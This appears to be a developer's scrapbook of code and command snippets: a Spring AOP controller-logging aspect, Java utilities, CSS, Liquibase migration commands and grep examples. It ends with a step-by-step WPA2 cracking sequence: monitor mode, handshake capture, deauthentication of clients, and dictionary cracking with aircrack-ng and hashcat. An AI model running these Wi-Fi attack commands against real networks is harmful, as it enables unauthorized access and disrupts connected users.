                if (consumes.equals(MediaType.APPLICATION_JSON_VALUE)) {
                    someArgNeedsSerialization = true;
                    break;
                }
            }
        }

        stringBuilder.append(" called with arguments: ");

        for (int i = 0, length = argNames.length; i < length; ++i) {
            boolean needsSerialization = false;

            if (someArgNeedsSerialization) {
                // We only need to serialize a param if @RequestBody annotation is found.
                for (Annotation annotation : annotations[i]) {
                    if (annotation instanceof RequestBody) {
                        needsSerialization = true;
                        break;
                    }
                }
            }

            stringBuilder.append(argNames[i]).append(": [");
            if (needsSerialization) {
                String argClassName = argValues[i] == null ? "NULL" : argValues[i].getClass().getName();
                serialize(argValues[i], argClassName, stringBuilder);
            } else {
                stringBuilder.append(argValues[i]);
            }
            stringBuilder.append("]").append(i == (length - 1) ? "" : ", ");
        }
    }
}


    @Nonnull
    public static String toJson(@Nullable Object object) {
        try {
            return object == null ? "null" : OBJECT_MAPPER.writeValueAsString(object);
        } catch (JsonProcessingException e) {
            throw new RuntimeException(e);
        }
    }

    public static <T> T fromJson(@Nonnull String json, @Nonnull Type type) {
        JavaType javaType = OBJECT_MAPPER.constructType(type);
        try {
            return OBJECT_MAPPER.readValue(json, javaType);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
	
	
import java.lang.annotation.Annotation;

import javax.annotation.Nonnull;
import javax.annotation.Nullable;

import io.github.logger.controller.annotation.NoLogging;
import io.github.logger.controller.utils.JsonUtil;
import io.github.logger.controller.utils.RequestUtil;
import org.apache.commons.lang3.time.StopWatch;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.AfterThrowing;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.aspectj.lang.reflect.MethodSignature;
import org.slf4j.Logger;
import org.springframework.core.io.ByteArrayResource;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.multipart.MultipartFile;

import io.github.logger.controller.annotation.Logging;

//@formatter:off
/**
 * This class is responsible for performing logging on Controller methods.
 * It used Spring AspectJ (not native Spring CGLib AOP) for weaving logging logic into matching controller methods.
 *
 * <p>This aspect uses two annotations - {@link Logging} and {@link NoLogging} to gain fine-grain control over
 * method logging behavior.
 *
 * @see <a href="http://docs.spring.io/spring/docs/current/spring-framework-reference/html/aop.html">
 *          Spring Documentation on Aspect Oriented Programming with Spring
 *      </a>
 */
//@formatter:on

@Aspect
public class GenericControllerAspect implements ControllerAspect {

    private static final Logger LOG = org.slf4j.LoggerFactory.getLogger(GenericControllerAspect.class);

    @Pointcut("@annotation(io.github.logger.controller.annotation.Logging) " +
            "|| @target(io.github.logger.controller.annotation.Logging)")
    public void methodOrClassLoggingEnabledPointcut() {
    }

    @Pointcut("!@annotation(io.github.logger.controller.annotation.NoLogging)")
    public void methodLoggingNotDisabledPointcut() {
    }

    @Pointcut("within(@org.springframework.web.bind.annotation.RestController *) ||" +
            "within(@org.springframework.stereotype.Controller *)")
    public void allPublicControllerMethodsPointcut() {
    }

    @Around("allPublicControllerMethodsPointcut() "
            + "&& methodLoggingNotDisabledPointcut() "
            + "&& methodOrClassLoggingEnabledPointcut()")
    @Nullable
    public Object log(@Nonnull ProceedingJoinPoint proceedingJoinPoint) throws Throwable {
        Object result = null;
        String returnType = null;
        RequestMapping methodRequestMapping = null;
        RequestMapping classRequestMapping = null;

        try {
            MethodSignature methodSignature = (MethodSignature)proceedingJoinPoint.getSignature();
            methodRequestMapping = methodSignature.getMethod().getAnnotation(RequestMapping.class);
            classRequestMapping = proceedingJoinPoint.getTarget().getClass().getAnnotation(RequestMapping.class);

            // this is required to distinguish between a returned value of null and no return value, as in case of
            // void return type.
            returnType = methodSignature.getReturnType().getName();

            logPreExecutionData(proceedingJoinPoint, methodRequestMapping);
        } catch (Exception e) {
            LOG.error("Exception occurred in pre-proceed logic", e);
        }

        StopWatch timer = new StopWatch();
        try {
            timer.start();
            result = proceedingJoinPoint.proceed();
        } finally {
            timer.stop();
            if (returnType != null) {
                logPostExecutionData(
                        proceedingJoinPoint, timer, result, returnType, methodRequestMapping, classRequestMapping
                );
            }
        }

        return result;
    }

    public void logPreExecutionData(
            @Nonnull ProceedingJoinPoint proceedingJoinPoint,
            @Nullable RequestMapping methodRequestMapping) {
        MethodSignature methodSignature = (MethodSignature)proceedingJoinPoint.getSignature();

        String methodName = methodSignature.getName() + "()";
        Object argValues[] = proceedingJoinPoint.getArgs();
        String argNames[] = methodSignature.getParameterNames();
        String requestContext = RequestUtil.getRequestContext().toString();
        Annotation annotations[][] = methodSignature.getMethod().getParameterAnnotations();

        StringBuilder preMessage = new StringBuilder().append(methodName);

        if (argValues.length > 0) {
            logFunctionArguments(argNames, argValues, preMessage, annotations, methodRequestMapping);
        }

        preMessage.append(" called via ").append(requestContext);
        LOG.info(preMessage.toString());
    }

    public void logPostExecutionData(
            @Nonnull ProceedingJoinPoint proceedingJoinPoint,
            @Nonnull StopWatch timer,
            @Nullable Object result,
            @Nonnull String returnType,
            @Nullable RequestMapping methodRequestMapping,
            @Nullable RequestMapping classRequestMapping) {
        MethodSignature methodSignature = (MethodSignature)proceedingJoinPoint.getSignature();
        String methodName = methodSignature.getName() + "()";

        LOG.info(methodName + " took [" + timer.getTime() + " ms] to complete");

        if (LOG.isDebugEnabled()) {
            boolean needsSerialization = false;

            String produces[] = methodRequestMapping != null ? methodRequestMapping.produces() : new String[0];
            for (String produce : produces) {
                if (produce.equals(MediaType.APPLICATION_JSON_VALUE)) {
                    needsSerialization = true;
                    break;
                }
            }

            if (!needsSerialization) {
                produces = classRequestMapping != null ? classRequestMapping.produces() : new String[0];
                for (String produce : produces) {
                    if (produce.equals(MediaType.APPLICATION_JSON_VALUE)) {
                        needsSerialization = true;
                        break;
                    }
                }
            }

            StringBuilder postMessage = new StringBuilder().append(methodName).append(" returned: [");

            if (needsSerialization) {
                String resultClassName = result == null ? "null" : result.getClass().getName();
                resultClassName = returnType.equals("void") ? returnType : resultClassName;
                serialize(result, resultClassName, postMessage);
            } else {
                postMessage.append(result);
            }
            postMessage.append("]");
            LOG.debug(postMessage.toString());
        }
    }

    @AfterThrowing(
            pointcut = "allPublicControllerMethodsPointcut() && "
                    + "methodLoggingNotDisabledPointcut() && "
                    + "methodOrClassLoggingEnabledPointcut()",
            throwing = "t")
    public void onException(@Nonnull JoinPoint joinPoint, @Nonnull Throwable t) {
        String methodName = joinPoint.getSignature().getName() + "()";
        LOG.info(methodName + " threw exception: [" + t + "]");
    }

    public void serialize(@Nullable Object object, @Nonnull String objClassName, @Nonnull StringBuilder logMessage) {
        boolean serializedSuccessfully = false;
        Exception exception = null;

        // this is to distinguish between methods returning null value and methods returning void.
        // Object arg is null in both cases but objClassName is not.
        if (objClassName.toLowerCase().equals("void")) {
            logMessage.append(objClassName);
            serializedSuccessfully = true;
        }

        // try serializing assuming a perfectly serializable object.
        if (!serializedSuccessfully) {
            try {
                logMessage.append(JsonUtil.toJson(object));
                serializedSuccessfully = true;
            } catch (Exception e) {
                exception = e;
            }
        }

        // detect if its a mock object.
        if (!serializedSuccessfully && objClassName.toLowerCase().contains("mock")) {
            logMessage.append("Mock Object");
            serializedSuccessfully = true;
        }

        // try getting file size assuming object is a file type object
        if (!serializedSuccessfully) {
            long fileSize = -1;

            if (object instanceof ByteArrayResource) {
                fileSize = ((ByteArrayResource)object).contentLength();
            } else if (object instanceof MultipartFile) {
                fileSize = ((MultipartFile)object).getSize();
            }

            if (fileSize != -1) {
                logMessage.append("file of size:[").append(fileSize).append(" B]");
                serializedSuccessfully = true;
            }
        }

        if (!serializedSuccessfully) {
            LOG.warn("Unable to serialize object of type [{}] for logging", objClassName, exception);
        }
    }

    /**
     * Generated name-value pair of method's formal arguments. Appends the generated string in provided StringBuilder
     *
     * @param argNames String[] containing method's formal argument names Order of names must correspond to order on arg
     *            values in argValues.
     * @param argValues String[] containing method's formal argument values. Order of values must correspond to order on
     *            arg names in argNames.
     * @param stringBuilder the StringBuilder to append argument data to.
     */
    private void logFunctionArguments(
            @Nonnull String[] argNames,
            @Nonnull Object[] argValues,
            @Nonnull StringBuilder stringBuilder,
            @Nonnull Annotation annotations[][],
            @Nullable RequestMapping methodRequestMapping) {
        boolean someArgNeedsSerialization = false;

        if (methodRequestMapping != null) {
            for (String consumes : methodRequestMapping.consumes()) {
                if (consumes.equals(MediaType.APPLICATION_JSON_VALUE)) {
                    someArgNeedsSerialization = true;
                    break;
                }
            }
        }

        stringBuilder.append(" called with arguments: ");

        for (int i = 0, length = argNames.length; i < length; ++i) {
            boolean needsSerialization = false;

            if (someArgNeedsSerialization) {
                // We only need to serialize a param if @RequestBody annotation is found.
                for (Annotation annotation : annotations[i]) {
                    if (annotation instanceof RequestBody) {
                        needsSerialization = true;
                        break;
                    }
                }
            }

            stringBuilder.append(argNames[i]).append(": [");
            if (needsSerialization) {
                String argClassName = argValues[i] == null ? "NULL" : argValues[i].getClass().getName();
                serialize(argValues[i], argClassName, stringBuilder);
            } else {
                stringBuilder.append(argValues[i]);
            }
            stringBuilder.append("]").append(i == (length - 1) ? "" : ", ");
        }
    }
}
--------------------------------------------------------------------------------------------------------
https://www.programcreek.com/java-api-examples/index.php?project_name=jhipster%2Fgenerator-jhipster#
--------------------------------------------------------------------------------------------------------
			ReflectionUtils.traversFieldHierarchy( dataObjectClass, new FieldHandler() {
				
				{
					super.handlePublic = true;
				}

				@Override
				public boolean doHandle(Field inField) {
					
					final Variable theVariable = inField.getDeclaredAnnotation( Variable.class );
					
					if ( theVariable == null && !ReflectionUtils.isPublic( inField ) ) {
						return true;
					}
					
					final String theName = Utils.defaultIfBlank( theVariable == null ? null : theVariable.value(), inField.getName() );
					
					dataFields.put( theName , inField);
					
					return true;
				}
			});	
--------------------------------------------------------------------------------------------------------
	public static Map<String,String> UMLAUT_REPLACEMENTS = new MapBuilder<String,String>()//
			.put("\u00E4", "ae")//
			.put("\u00F6", "oe")//
			.put("\u00FC", "ue")//
			.put("\u00C4", "Ae")//
			.put("\u00D6", "Oe")//
			.put("\u00DC", "Ue")//
			.put("\u00DF", "ss")//
			.get(true);
--------------------------------------------------------------------------------------------------------
public class Functions {
    public static <T> Function<T, T> identity() {
        return new Function<T, T>() {
            @Override
            public T apply(T input) {
                return input;
            }
        };
    }

    public static <T> Function<T, Void> STDOUT() {
        return new Function<T, Void>() {
            @Override
            public Void apply(T input) {
                System.out.println(input);
                return null;
            }
        };
    }

    public static <T> Function<T, Void> STDERR() {
        return new Function<T, Void>() {
            @Override
            public Void apply(T input) {
                System.err.println(input);
                return null;
            }
        };
    }
}
--------------------------------------------------------------------------------------------------------
#!/usr/bin/perl -w
use SOAP::Lite;
my $url = 'http://127.0.0.1:9876/ts?wsdl';
my $service = SOAP::Lite->service($url);
print "\nCurrent time is: ", $service->getTimeAsString();
print "\nElapsed milliseconds from the epoch: ", $service->getTimeAsElapsed();
--------------------------------------------------------------------------------------------------------
import java.util.Arrays;
import java.util.List;
import java.util.function.Function;

public enum Pluralize implements Function<String, String> {

    FUNCTION;

    private static final List<String> UNCOUNTABLE = Arrays.asList("equipment", "fish", "information", "money", "rice", "series", "sheep", "species");

    private static final List<Function<String, String>> PLURALS = Arrays.<Function<String, String>>asList(
            //Irregulars
            new StringReplace("(p)eople$", "$1erson"),
            new StringReplace("(m)en$", "$1an"),
            new StringReplace("(c)hildren$", "$1hild"),
            new StringReplace("(s)exes$", "$1ex"),
            new StringReplace("(m)oves$", "$1ove"),
            new StringReplace("(s)tadiums$", "$1tadium"),

            //Rules
            new StringReplace("(quiz)$", "$1zes"),
            new StringReplace("(matr)ix$", "$1ices"),
            new StringReplace("(vert|ind)ex$", "$1ices"),
            new StringReplace("^(ox)$", "$1en"),
            new StringReplace("(alias|status)$", "$1"),
            new StringReplace("(alias|status)$", "$1es"),
            new StringReplace("(octop|vir)us$", "$1us"),
            new StringReplace("(cris|ax|test)is$", "$1es"),
            new StringReplace("(shoe)$", "$1s"),
            new StringReplace("(o)$", "$1es"),
            new StringReplace("(bus)$", "$1es"),
            new StringReplace("([m|l])ouse$", "$1ice"),
            new StringReplace("(x|ch|ss|sh)$", "$1es"),
            new StringReplace("(m)ovie$", "$1ovies"),
            new StringReplace("(s)eries$", "$1eries"),
            new StringReplace("([^aeiouy]|qu)y$", "$1ies"),
            new StringReplace("([lr])f$", "$1ves"),
            new StringReplace("(tive)$", "$1s"),
            new StringReplace("(hive)$", "$1s"),
            new StringReplace("([^f])fe$", "$1ves"),
            new StringReplace("(^analy)sis$", "$1sis"),
            new StringReplace("((a)naly|(b)a|(d)iagno|(p)arenthe|(p)rogno|(s)ynop|(t)he)ses$", "$1$2sis"),
            new StringReplace("([ti])um$", "$1a"),
            new StringReplace("(n)ews$", "$1ews"),
            new StringReplace("(s|si|u)s$", "$1s")
    );

    public String apply(String word) {
        if (word == null) {
            return null;
        } else if (word.isEmpty()) {
            return word;
        } else if (UNCOUNTABLE.contains(word)) {
            return word;
        }

        for (Function<String, String> function : PLURALS) {
            String result = function.apply(word);
            if (result != null) {
                return result;
            }
        }
        return word + "s";
    }

}
--------------------------------------------------------------------------------------------------------
LoadingCache<Key, Graph> graphs = Caffeine.newBuilder()
    .maximumSize(10_000)
    .expireAfterWrite(5, TimeUnit.MINUTES)
    .refreshAfterWrite(1, TimeUnit.MINUTES)
    .build(key -> createExpensiveGraph(key));
--------------------------------------------------------------------------------------------------------
import java.util.Iterator;

public interface PeekableIterator<T> extends Iterator<T> {
    static <T> PeekableIterator<T> peeking(Iterator<T> iterator) {
        return new PeekableIterator<T>() {
            private T buffer = null;
            @Override
            public T peek() {
                if (buffer == null) {
                    buffer = iterator.hasNext() ? iterator.next() : null;
                }
                return buffer;
            }

            @Override
            public boolean hasNext() {
                return buffer != null || iterator.hasNext();
            }

            @Override
            public T next() {
                T result = buffer == null ? iterator.next() : buffer;
                buffer = null;
                return result;
            }
        };
    }
    T peek();
}
--------------------------------------------------------------------------------------------------------
public class ContactInfoValidator implements ConstraintValidator<ContactInfo, String> {

    private static final Logger LOG = Logger.getLogger(ContactInfoValidator.class);

    @Value("${contactInfoType}")
    private String expressionType;

    private String pattern;

    @Autowired
    private ContactInfoExpressionRepository expressionRepository;

    @Override
    public void initialize(ContactInfo contactInfo) {
        if (StringUtils.isEmptyOrWhitespace(expressionType)) {
            LOG.error("Contact info type missing!");
        } else {
            pattern = expressionRepository.findById(expressionType)
              .map(ContactInfoExpression::getPattern).get();
        }
    }

    @Override
    public boolean isValid(String value, ConstraintValidatorContext context) {
        if (!StringUtils.isEmptyOrWhitespace(pattern)) {
            return Pattern.matches(pattern, value);
        }
        LOG.error("Contact info pattern missing!");
        return false;
    }
}

@Constraint(validatedBy = { ContactInfoValidator.class })
@Target({ METHOD, FIELD, ANNOTATION__TYPE, CONSTRUCTOR, PARAMETER })
@Retention(RetentionPolicy.RUNTIME)
public @interface ContactInfo {
    String message() default "Invalid value";

    Class<?>[]groups() default {};

    Class<? extends Payload>[]payload() default {};
}
--------------------------------------------------------------------------------------------------------
@EnableJpaRepositories("com.baeldung.dynamicvalidation.dao")
@EntityScan("com.baeldung.dynamicvalidation.model")
@Configuration
public class PersistenceConfig {

    @Bean
    public DataSource dataSource() {
        EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();
        EmbeddedDatabase db = builder.setType(EmbeddedDatabaseType.H2)
          .addScript("schema-expressions.sql")
          .addScript("data-expressions.sql")
          .build();
        return db;
    }
}
--------------------------------------------------------------------------------------------------------

// class annotations as before
@Builder(builderClassName = "PojoBuilder")
public class Pojo {
    private String name = "foo";
    private boolean original = true;
 
    public static class PojoBuilder {
        private String name = "foo";
        private boolean original = true;
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
public class ReloadablePropertySourceConfig {
 
    private ConfigurableEnvironment env;
 
    public ReloadablePropertySourceConfig(@Autowired ConfigurableEnvironment env) {
        this.env = env;
    }
 
    @Bean
    @ConditionalOnProperty(name = "spring.config.location", matchIfMissing = false)
    public ReloadablePropertySource reloadablePropertySource(PropertiesConfiguration properties) {
        ReloadablePropertySource ret = new ReloadablePropertySource("dynamic", properties);
        MutablePropertySources sources = env.getPropertySources();
        sources.addFirst(ret);
        return ret;
    }
}
--------------------------------------------------------------------------------------------------------
public class ReloadablePropertySource extends PropertySource {
 
    PropertiesConfiguration propertiesConfiguration;
 
    public ReloadablePropertySource(String name, PropertiesConfiguration propertiesConfiguration) {
        super(name);
        this.propertiesConfiguration = propertiesConfiguration;
    }
 
    public ReloadablePropertySource(String name, String path) {
        super(StringUtils.isEmpty(name) ? path : name);
        try {
            this.propertiesConfiguration = new PropertiesConfiguration(path);
            this.propertiesConfiguration.setReloadingStrategy(new FileChangedReloadingStrategy());
        } catch (Exception e) {
            throw new PropertiesException(e);
        }
    }
 
    @Override
    public Object getProperty(String s) {
        return propertiesConfiguration.getProperty(s);
    }
}
--------------------------------------------------------------------------------------------------------
    private static final Map<String, Character> CHARS = new HashMap<String, Character>() {{
        put("passed", '.');
        put("undefined", 'U');
        put("pending", 'P');
        put("skipped", '-');
        put("failed", 'F');
    }};
    private static final Map<String, AnsiEscapes> ANSI_ESCAPES = new HashMap<String, AnsiEscapes>() {{
        put("passed", AnsiEscapes.GREEN);
        put("undefined", AnsiEscapes.YELLOW);
        put("pending", AnsiEscapes.YELLOW);
        put("skipped", AnsiEscapes.CYAN);
        put("failed", AnsiEscapes.RED);
    }};
--------------------------------------------------------------------------------------------------------
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #800080; font-weight: bold; } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kn { font-weight: bold } /* Keyword.Namespace */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */

.type-csharp .highlight .k { color: #0000FF }
.type-csharp .highlight .kt { color: #0000FF }
.type-csharp .highlight .nf { color: #000000; font-weight: normal }
.type-csharp .highlight .nc { color: #2B91AF }
.type-csharp .highlight .nn { color: #000000 }
.type-csharp .highlight .s { color: #A31515 }
.type-csharp .highlight .sc { color: #A31515 }
--------------------------------------------------------------------------------------------------------
import java.util.Comparator;
import java.util.function.Function;
import java.util.stream.Stream;

public final class Joins<L> {

    private final Stream<L> lefts;

    private Joins(Stream<L> lefts) {
        this.lefts = lefts;
    }

    public static <L> Joins<L> join(Stream<L> lefts) {
        return new Joins<>(lefts);
    }

    public <K extends Comparable<K>> JoinBuilder<K, L> on(Function<? super L, ? extends K> foreignKey) {
        return comparingWith(Comparator.<K>naturalOrder()).on(foreignKey);
    }

    public static interface ComparatorCapture<K, L> {
        JoinBuilder<K, L> on(Function<? super L, ? extends K> foreignKey);
    }

    public <K> ComparatorCapture<K, L> comparingWith(Comparator<? super K> comparator) {
        return f -> new JoinBuilder<>(comparator, lefts, JoinKey.on(f, comparator));
    }

    public static final class JoinBuilder<K, L> {
        private final Comparator<? super K> comparator;
        private final Stream<L> lefts;
        private final JoinKey<L, K> foreignKey;

        public JoinBuilder(Comparator<? super K> comparator, Stream<L> lefts, JoinKey<L, K> foreignKey) {
            this.comparator = comparator;
            this.lefts = lefts;
            this.foreignKey = foreignKey;
        }

        public <R> Joiner<L, R, K> to(Function<? super R, ? extends K> primaryKey) {
            return new Joiner<>(foreignKey.index(lefts), JoinKey.on(primaryKey, comparator));
        }
    }
}
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### HTTPD
--------------------------------------------------------------------------------------------------------
sudo service httpd start
​sudo service httpd stop
​sudo service httpd restart
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### Liquibase
--------------------------------------------------------------------------------------------------------
UPDATE DATABASECHANGELOGLOCK SET LOCKED=FALSE, LOCKGRANTED=null, LOCKEDBY=null where ID=1;
DELETE FROM DATABASECHANGELOGLOCK;
Drop DATABASE DATABASECHANGELOGLOCK;

<changeSet author="user" id="123">
  <preConditions onFail="CONTINUE">
    <not><sequenceExists sequenceName="SEQUENCE_NAME_SEQ" /></not>
  </preConditions>
  <createSequence sequenceName="SEQUENCE_NAME_SEQ"/>
</changeSet>

  <changeSet author="user" id="123">
  <preConditions onFail="CONTINUE">
          <sqlCheck expectedResult="0">
            select count(*) from user_sequences where sequence_name = 'SEQUENCE_NAME_SEQ';
          </sqlCheck>
  </preConditions>
  <createSequence sequenceName="SEQUENCE_NAME_SEQ"/>
</changeSet>

java -jar liquibase.jar --changeLogFile="./data/<insert file name> " --diffTypes="data" generateChangeLog

liquibase --changeLogFile=mydb.xml generateChangeLog
liquibase --changeLogFile=mydb.xml changelogSync
liquibase --changeLogFile=mydb.xml update
--------------------------------------------------------------------------------------------------------
<changeSet author="e-ballo" id="DropViewsAndcreateSynonyms" context="dev,int,uat,prod">
    <preConditions onFail="CONTINUE" >
        <viewExists viewName="PMV_PACKAGE_ITEMS" schemaName="ZON"/>
        <viewExists viewName="PMV_SUBSPLAN_INSTALLTYPES" schemaName="ZON"/>
    </preConditions>
    <dropView schemaName="ZON" viewName="PMV_PACKAGE_ITEMS"  />
    <dropView schemaName="ZON" viewName="PMV_SUBSPLAN_INSTALLTYPES"  />
    <sqlFile path="environment-synonyms.sql" relativeToChangelogFile="true" splitStatements="true" stripComments="true"/>
</changeSet>
--------------------------------------------------------------------------------------------------------
Standard Migrator Run
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=\path\to\classes:jdbcdriver.jar \
      --changeLogFile=com/example/db.changelog.xml \
      --url="jdbc:oracle:thin:@localhost:1521:oracle" \
      --username=scott \
      --password=tiger \
      update
Run Migrator pulling changelogs from a .WAR file
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=website.war \
      --changeLogFile=com/example/db.changelog.xml \
      --url=jdbc:oracle:thin:@localhost:1521:oracle \
      --username=scott \
      --password=tiger \
      update
Run Migrator pulling changelogs from an .EAR file
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=application.ear \
      --changeLogFile=com/example/db.changelog.xml \
      --url=jdbc:oracle:thin:@localhost:1521:oracle \
      --username=scott \
      --password=tiger
Don’t execute changesets, save SQL to /tmp/script.sql
java -jar liquibase.jar \
        --driver=oracle.jdbc.OracleDriver \
        --classpath=jdbcdriver.jar \
        --url=jdbc:oracle:thin:@localhost:1521:oracle \
        --username=scott \
        --password=tiger \
        updateSQL > /tmp/script.sql
List locks on the database change log
java -jar liquibase.jar \
        --driver=oracle.jdbc.OracleDriver \
        --classpath=jdbcdriver.jar \
        --url=jdbc:oracle:thin:@localhost:1521:oracle \
        --username=scott \
        --password=tiger \
        listLocks
Add url parameters useUnicode=true and characterEncoding=UTF-8 to set character encoding to utf8.
--------------------------------------------------------------------------------------------------------
brew cask install pennywise
--------------------------------------------------------------------------------------------------------
grep -Rw '/path/to/search/' -e 'pattern'
grep --exclude=*.csv -Rw '/path/to/search' -e 'pattern'
grep --exclude-dir={dir1,dir2,*_old} -Rw '/path/to/search' -e 'pattern'
find . -name "*.php" -exec grep "pattern" {} \;
ack 'pattern'
ack 'pattern' /path/to/file.txt
--------------------------------------------------------------------------------------------------------
# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

########## crack password with aircrack-ng... ##########

# download 134MB rockyou.txt dictionary file if needed
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack w/ aircrack-ng
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## or crack password with naive-hashcat ##########

# convert cap to hccapx
cap2hccapx.bin capture/-01.cap capture/-01.hccapx

# crack with naive-hashcat
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh

# not all clients respect broadcast deauths though
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0

# -0 2 specifies we would like to send 2 deauth packets. Increase this number
# if need be with the risk of noticeably interrupting client network activity
# -a is the MAC of the access point
# -c is the MAC of the client
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

# -a2 specifies WPA2, -b is the BSSID, -w is the wordfile
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap

# download the 134MB rockyou dictionary file
